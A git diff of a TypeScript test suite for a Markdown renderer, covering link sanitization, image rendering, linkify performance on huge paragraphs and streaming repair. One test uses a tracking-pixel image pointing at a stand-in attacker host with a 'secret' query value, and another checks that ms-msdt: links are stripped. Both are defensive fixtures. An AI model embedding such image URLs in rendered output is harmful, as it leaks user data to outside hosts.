@@ -22,10 +22,10 @@ const sanitizeHooks: {
 // Mirrors DOMPurify's default URI policy: approved schemes plus relative URLs.
 const DOMPURIFY_ALLOWED_URI_RE =
   // Keep this byte-aligned with DOMPurify's default IS_ALLOWED_URI expression.
-  // eslint-disable-next-line no-useless-escape
+  // oxlint-disable-next-line no-useless-escape
   /^(?:(?:(?:f|ht)tps?|mailto|tel|callto|sms|cid|xmpp|matrix):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i;
 const URI_ATTRIBUTE_WHITESPACE_RE =
-  // eslint-disable-next-line no-control-regex
+  // oxlint-disable-next-line no-control-regex
   /[\u0000-\u0020\u00A0\u1680\u180E\u2000-\u2029\u205F\u3000]/g;
 
 Object.assign(globalThis, {
@@ -59,11 +59,12 @@ mock.module('./markdown-worker', () => ({
 import { escapeRawMarkdownHtml, isLocalFileUrl, MARKDOWN_FORBIDDEN_TAGS } from './markdownSecurity';
 
 const {
-  __markdownImageCandidateCacheForTests,
-  extractMarkdownImageCandidates,
+  __scanStatsForTests,
   getCachedMarkdownBlocks,
+  LINKIFY_SOURCE_LIMIT,
   renderMarkdownBlocks,
   renderMarkdownSync,
+  resetScanStatsForTests,
   resetMarkdownHtmlCacheForTests,
 } = await import('./markdownCore');
 const { resolveMarkdownImageSource } = await import('./markdownImageAssets');
@@ -103,6 +104,33 @@ describe('markdown sanitization', () => {
     expect(html).not.toContain('href="ms-msdt:/id%20PCWDiagnostic"');
   });
 
+  test('keeps session links, including pasted ones, and strips other OpenChamber routes', () => {
+    const html = renderMarkdownSync([
+      'Pasted: openchamber://session/ses_abc?message=msg_123',
+      '[labelled](openchamber://session/ses_abc)',
+      '[pairing](openchamber://connect?v=2&p=secret)',
+    ].join('\n\n'), 'inline');
+
+    expect(html).toContain('href="openchamber://session/ses_abc?message=msg_123"');
+    expect(html).toContain('href="openchamber://session/ses_abc"');
+    expect(html).not.toContain('href="openchamber://connect');
+  });
+
+  test('renders an attachment citation as a labelled chip without a link', () => {
+    const html = renderMarkdownSync('See [shot.png](#openchamber-attachment:png:shot%40%282x%29.png) here', 'inline');
+
+    expect(html).toContain('data-attachment-citation="png"');
+    expect(html).toContain('>shot@(2x).png</span>');
+    expect(html).not.toContain('href="#openchamber-attachment');
+  });
+
+  test('renders a skill link as a chip that still opens the skill', () => {
+    const html = renderMarkdownSync('Use [/review](#openchamber-skill:review) here', 'inline');
+
+    expect(html).toContain('data-skill-name="review"');
+    expect(html).toContain('title="$review">review</a>');
+  });
+
 });
 
 describe('Markdown parser failures', () => {
@@ -131,17 +159,6 @@ describe('Markdown parser failures', () => {
     expect(getCachedMarkdownBlocks(source)?.[0]?.html).toBe(fallback);
     const healthy = await renderMarkdownBlocks('**still healthy**', false);
     expect(healthy[0]?.html).toContain('<strong>still healthy</strong>');
-  }, PARSER_OVERFLOW_TIMEOUT_MS);
-
-  test('keeps images from other messages when one message cannot be scanned', () => {
-    expect(extractMarkdownImageCandidates([
-      '![before](https://example.test/before.png)',
-      source,
-      '![after](https://example.test/after.png)',
-    ])).toEqual([
-      { source: 'https://example.test/before.png', filename: 'before.png' },
-      { source: 'https://example.test/after.png', filename: 'after.png' },
-    ]);
   }, PARSER_OVERFLOW_TIMEOUT_MS);
 });
 
@@ -266,96 +283,38 @@ describe('Markdown images', () => {
     expect(html).not.toContain('data-openchamber-markdown-image-label');
   });
 
-  test('collects image syntax across mixed Markdown and ignores links and code', () => {
-    const candidates = extractMarkdownImageCandidates([
-      [
-        'Before [local link](screens/first%20view.png) and `![code](ignored.png)`.',
-        '',
-        '- ![duplicate](screens/first%20view.png)',
-        '- ![remote](https://example.test/second.webp?size=2)',
-        '',
-        '```md',
-        '![fenced](ignored-too.jpg)',
-        '```',
-      ].join('\n'),
-      'After ![third](data:image/png;base64,AAAA).',
-    ]);
+  test('links remote images in tool output and keeps local ones drawn', () => {
+    const html = renderMarkdownSync([
+      '![tracker](https://evil.example/pixel.png?seen=secret)',
+      '![screenshot](screens/run.png)',
+      '[![badge](https://img.shields.io/badge/ci-passing-green)](https://ci.example)',
+    ].join('\n\n'), 'local');
 
-    expect(candidates).toEqual([
-      { source: 'screens/first%20view.png', filename: 'first view.png' },
-      { source: 'https://example.test/second.webp?size=2', filename: 'second.webp' },
-      { source: 'data:image/png;base64,AAAA', filename: 'third' },
-    ]);
+    // The remote image never becomes an <img>: it is a link to open on purpose.
+    expect(html).not.toContain('<img src="https://');
+    expect(html).toContain('<a href="https://evil.example/pixel.png?seen=secret" class="external-link"');
+    expect(html).toContain('<img src="screens/run.png" alt="screenshot">');
+    // A badge inside a link stays a label: a link cannot hold another.
+    expect(html.match(/<a /g)).toHaveLength(2);
   });
 
-  test('does not add an ordinary local image link to the gallery', () => {
-    expect(extractMarkdownImageCandidates(['[download](screens/image.png)'])).toEqual([]);
-  });
-
-  test('limits one finalized message gallery to twelve unique candidates', () => {
-    const markdown = Array.from({ length: 14 }, (_, index) => `![image ${index}](screens/${index}.png)`).join('\n');
-
-    const candidates = extractMarkdownImageCandidates([markdown]);
-
-    expect(candidates).toHaveLength(12);
-    expect(candidates.at(-1)?.source).toBe('screens/11.png');
-  });
-
-  test('reuses extracted candidates across virtualized remounts without changing gallery behavior', () => {
-    __markdownImageCandidateCacheForTests.reset();
-    const contents = Array.from({ length: 20 }, (_, index) => `![image ${index}](screens/${index}.png)`);
-
-    expect(extractMarkdownImageCandidates(contents)).toHaveLength(12);
-    expect(__markdownImageCandidateCacheForTests.stats().scans).toBe(12);
-
-    for (let round = 0; round < 1000; round += 1) {
-      expect(extractMarkdownImageCandidates(contents)).toHaveLength(12);
-    }
-
-    const stats = __markdownImageCandidateCacheForTests.stats();
-    expect(stats.entries).toBe(12);
-    expect(stats.scans).toBe(12);
-  });
-
-  test('scans one thousand independent messages once across virtualized remounts', () => {
-    __markdownImageCandidateCacheForTests.reset();
-    const messages = Array.from(
-      { length: 1000 },
-      (_, index) => `![image ${index}](screens/${index}.png)`,
-    );
-
-    for (const message of messages) extractMarkdownImageCandidates([message]);
-    for (const message of messages) extractMarkdownImageCandidates([message]);
-
-    const stats = __markdownImageCandidateCacheForTests.stats();
-    expect(stats.entries).toBe(1000);
-    expect(stats.scans).toBe(1000);
-  });
-
-  test('gives embedded images without alt text a stable filename', () => {
+  test('keeps the source of local and embedded images for drawing in place', () => {
     const source = 'data:image/png;base64,AAAA';
+    const html = renderMarkdownSync([
+      '![shot](screens/first%20view.png)',
+      `![](${source})`,
+      '![remote](https://example.test/second.webp)',
+      '[![badge](screens/badge.png)](https://ci.example)',
+      '![vector](screens/diagram.svg)',
+    ].join('\n\n'), 'label');
 
-    expect(extractMarkdownImageCandidates([`![](${source})`])).toEqual([
-      { source, filename: 'image.png' },
-    ]);
-    expect(renderMarkdownSync(`![](${source})`, 'label')).toContain('image.png');
-  });
-
-  test('bounds cached candidate entries and bytes, and skips oversized individual content', () => {
-    __markdownImageCandidateCacheForTests.reset();
-    for (let index = 0; index < 1025; index += 1) {
-      extractMarkdownImageCandidates([`![image ${index}](screens/${index}.png)`]);
-    }
-    const boundedStats = __markdownImageCandidateCacheForTests.stats();
-    expect(boundedStats.entries).toBe(1024);
-    expect(boundedStats.bytes <= 2 * 1024 * 1024).toBe(true);
-
-    __markdownImageCandidateCacheForTests.reset();
-    const oversized = `![image](screens/large.png)\n${'x'.repeat(64 * 1024)}`;
-
-    extractMarkdownImageCandidates([oversized]);
-    extractMarkdownImageCandidates([oversized]);
-    expect(__markdownImageCandidateCacheForTests.stats()).toEqual({ entries: 0, bytes: 0, scans: 2 });
+    expect(html).toContain('data-openchamber-markdown-image-source="screens/first%20view.png">first view.png</span>');
+    expect(html).toContain(`data-openchamber-markdown-image-source="${source}">image.png</span>`);
+    // Remote images stay links, a badge inside a link stays a label, and an
+    // unsupported format has nothing to draw.
+    expect(html).not.toContain('data-openchamber-markdown-image-source="https://');
+    expect(html).not.toContain('data-openchamber-markdown-image-source="screens/badge.png"');
+    expect(html).not.toContain('data-openchamber-markdown-image-source="screens/diagram.svg"');
   });
 
   test('validates embedded image bytes against the declared MIME type', async () => {
@@ -411,6 +370,177 @@ describe('CJK-aware link parsing', () => {
     );
     expect(hrefOf(renderMarkdownSync('[a](url(1))'))).toBe('url(1)');
     expect(hrefOf(renderMarkdownSync('[a](url "title")'))).toBe('url');
+  });
+});
+
+describe('Long paragraphs', () => {
+  const hrefOf = (html: string): string | null => /<a\b[^>]*href="([^"]*)"/.exec(html)?.[1] ?? null;
+  const LIMIT = LINKIFY_SOURCE_LIMIT;
+  const cjkLink = 'https://example.com。 ';
+  // The link opens the paragraph, so linkify sees the whole paragraph as the
+  // text that remains.
+  const paragraphOf = (length: number): string => `${cjkLink}${'x'.repeat(length - cjkLink.length)}`;
+
+  // The reporter's data dump from openchamber/openchamber#4204: pretty-printed
+  // JSON with no blank line, about 250 KB in one paragraph.
+  const dataDump = (): string => {
+    let seed = 7;
+    const pick = (values: readonly string[]): string | undefined => {
+      seed = (seed * 1664525 + 1013904223) >>> 0;
+      return values[Math.floor((seed / 0x100000000) * values.length)];
+    };
+    const rows = Array.from({ length: 1800 }, (_, i) => ({
+      id: `item_${i}`,
+      label: pick(['alpha_beta', 'gamma_delta', 'epsilon_zeta', 'eta_theta', 'iota_kappa']),
+      link: pick(['/Main', '/List', '/Detail', '/data/nested']),
+      count_a: 1000 + i,
+      ratio_b: 30 + (i % 20),
+      state: pick(['ok', 'warning', 'unread']),
+    }));
+    return `Review the following data dump. Docs: https://example.com/docs\n\n${JSON.stringify(rows, null, 2)}\nwith \\(x^2\\) at the end`;
+  };
+
+  test('a paragraph up to the limit keeps the CJK-aware link boundary', () => {
+    expect(paragraphOf(LIMIT)).toHaveLength(LIMIT);
+    expect(hrefOf(renderMarkdownSync(paragraphOf(LIMIT)))).toBe('https://example.com');
+    expect(hrefOf(renderMarkdownSync(paragraphOf(LIMIT - 1)))).toBe('https://example.com');
+  });
+
+  test('a longer paragraph still links bare URLs, through the GFM autolink', () => {
+    expect(hrefOf(renderMarkdownSync(paragraphOf(LIMIT + 1)))).toBe('https://example.com。');
+  });
+
+  test('long messages of short paragraphs and large code blocks keep linkify', () => {
+    const log = Array.from({ length: 400 }, (_, i) => `line ${i}: status ok`).join('\n');
+    const withCode = `See ${cjkLink}\n\n\`\`\`\n${log}\n\`\`\``;
+    expect(log.length).toBeGreaterThan(LIMIT);
+    expect(hrefOf(renderMarkdownSync(withCode))).toBe('https://example.com');
+
+    const crlf = Array.from({ length: 200 }, () => `See ${cjkLink}`).join('\r\n\r\n');
+    expect(crlf.length).toBeGreaterThan(LIMIT);
+    const html = renderMarkdownSync(crlf);
+    expect(html.match(/href="https:\/\/example\.com"/g)).toHaveLength(200);
+  });
+
+  test('the data dump from the report opens without the quadratic rescan', async () => {
+    resetMarkdownHtmlCacheForTests();
+    const text = dataDump();
+    expect(text.length).toBeGreaterThan(250_000);
+    // Opening a message paints it synchronously, then renders its blocks.
+    // Before the fix linkify searched the rest of the paragraph at every inline
+    // token, billions of characters for this dump. Now it only searches while
+    // at most LIMIT characters remain, which bounds each paragraph by LIMIT².
+    resetScanStatsForTests();
+    const html = renderMarkdownSync(text);
+    const settled = await renderMarkdownBlocks(text, false);
+    expect(__scanStatsForTests().linkify).toBeLessThan(2 * LIMIT * LIMIT);
+    expect(html).toContain('item_1799');
+    expect(hrefOf(html)).toBe('https://example.com/docs');
+    expect(html).toContain('class="katex"');
+    expect(settled.map((block) => block.html).join('')).toContain('item_1799');
+  });
+
+  test('a paragraph without `:`, `/` or `@` skips the linkify search', () => {
+    // Every bold and emphasis span is an inline token, and linkify searched the
+    // rest of the paragraph at each one (openchamber/openchamber#4648).
+    const prose = 'A simple sentence with **bold** and _emphasis_. '.repeat(80);
+    expect(prose.length).toBeLessThan(LIMIT);
+    resetScanStatsForTests();
+    expect(renderMarkdownSync(prose)).toContain('<strong>bold</strong>');
+    expect(__scanStatsForTests().linkify).toBe(0);
+
+    resetScanStatsForTests();
+    expect(hrefOf(renderMarkdownSync(`${prose}${cjkLink}`))).toBe('https://example.com');
+    expect(__scanStatsForTests().linkify).toBeGreaterThan(0);
+  });
+});
+
+describe('Many short paragraphs', () => {
+  const paragraphs = Array.from({ length: 16_000 }, (_, i) => `Paragraph ${i} is short.`).join('\n\n');
+  const text = `${paragraphs}\n\n\\[\nx^2\n\\]\n\n<details><summary>More</summary>\n\nHidden text\n\n</details>`;
+
+  // Before, each block searched the rest of the message for `\\[` and
+  // `<details>`: about 3 billion characters here. Now each search stops at the
+  // end of the paragraph. User messages reach the renderer with every newline
+  // turned into "  \n", so their empty lines hold two spaces.
+  for (const [label, source] of [
+    ['assistant text', text],
+    ['user text', text.replace(/ *\n/g, '  \n')],
+  ] as const) test(`block math and disclosures after thousands of paragraphs render in linear work (${label})`, () => {
+    expect(source.length).toBeGreaterThan(400_000);
+    resetScanStatsForTests();
+    const html = renderMarkdownSync(source);
+    expect(__scanStatsForTests().blockStart).toBeLessThan(4 * source.length);
+    expect(html).toContain('Paragraph 15999 is short.');
+    expect(html.match(/<p>/g)?.length).toBeGreaterThan(16_000);
+    expect(html).toContain('class="katex-display"');
+    expect(html).toContain('<summary>More</summary>');
+    expect(html).toContain('Hidden text');
+  });
+
+  // A line that interrupts a paragraph but is not a block of its own (an empty
+  // list marker, a table header with a broken delimiter row) used to be glued
+  // back onto the paragraph only when `\\[` or `<details>` appeared further down.
+  for (const [label, source, expected] of [
+    ['an empty list marker', 'text\n1. ', '<p>text</p>\n<p>1. </p>'],
+    ['a broken table', 'Intro text\n| a |\n|---|---|\nrow', '<p>Intro text</p>\n<p>| a |'],
+  ] as const) test(`${label} renders the same whether or not math follows`, () => {
+    const withoutMath = renderMarkdownSync(`${source}\n\nmore`);
+    const withMath = renderMarkdownSync(`${source}\n\n\\[x\\]`);
+    expect(withoutMath.startsWith(expected)).toBe(true);
+    expect(withMath.startsWith(expected)).toBe(true);
+  });
+
+  test('a disclosure or display math right after a paragraph line still ends it', () => {
+    expect(renderMarkdownSync('Intro line\n\\[\nx\n\\]')).toContain('<p>Intro line</p>');
+    const disclosure = renderMarkdownSync('Intro line\n<details><summary>S</summary>\n\nBody\n\n</details>');
+    expect(/<p>Intro line<\/p>\s*<details data-md-details>/.test(disclosure)).toBe(true);
+  });
+});
+
+describe('Streaming heal', () => {
+  const streamed = async (text: string): Promise<string> =>
+    (await renderMarkdownBlocks(text, true)).map((block) => block.html).join('');
+
+  test('an unfinished image is left out while it streams', async () => {
+    resetMarkdownHtmlCacheForTests();
+    expect(await streamed('See ![alt](https://exampl')).toBe('<p>See</p>\n');
+    const html = await streamed('x ![a](https://e.test/a.png) z ![b](htt');
+    expect(html).toContain('<img src="https://e.test/a.png"');
+    expect(html).not.toContain('streamdown:');
+    expect(html).not.toContain('alt="b"');
+    // Brackets or an opened marker in the alt text must not leave a broken
+    // image or a stray closer behind.
+    expect(await streamed('x ![a [b] c](https://e')).toBe('<p>x</p>\n');
+    expect(await streamed('a ![alt **bold](http')).toBe('<p>a</p>\n');
+  });
+
+  test('a finished paragraph streams the way it settles', async () => {
+    resetMarkdownHtmlCacheForTests();
+    // remend reads a ``` mid-sentence as an open fence. Healing finished
+    // blocks showed this paragraph as code until the stream ended.
+    const finished = 'Wrap it in ``` fences.';
+    const html = await streamed(`${finished}\n\nNext paragraph`);
+    expect(html.startsWith(renderMarkdownSync(finished))).toBe(true);
+    expect(html).not.toContain('<code>');
+  });
+
+  test('a single tilde between words streams the way it settles', async () => {
+    resetMarkdownHtmlCacheForTests();
+    const text = 'temp 20~25C and 30~40C';
+    expect(await streamed(text)).toBe(renderMarkdownSync(text));
+  });
+
+  test('healing a long streamed block full of underscores stays fast', async () => {
+    resetMarkdownHtmlCacheForTests();
+    // One list of snake_case rows: marked parses it in tens of ms, and remend
+    // 1.2.1 took about 3 s per stream step on it (openchamber/openchamber#4204).
+    const list = Array.from({ length: 5000 }, (_, i) => `- row_${i} has value_a and value_b_${i}`).join('\n');
+    expect(list.length).toBeGreaterThan(190_000);
+    const started = performance.now();
+    const html = await streamed(list);
+    expect(performance.now() - started).toBeLessThan(1_500);
+    expect(html).toContain('row_4999 has value_a and value_b_4999');
   });
 });
 
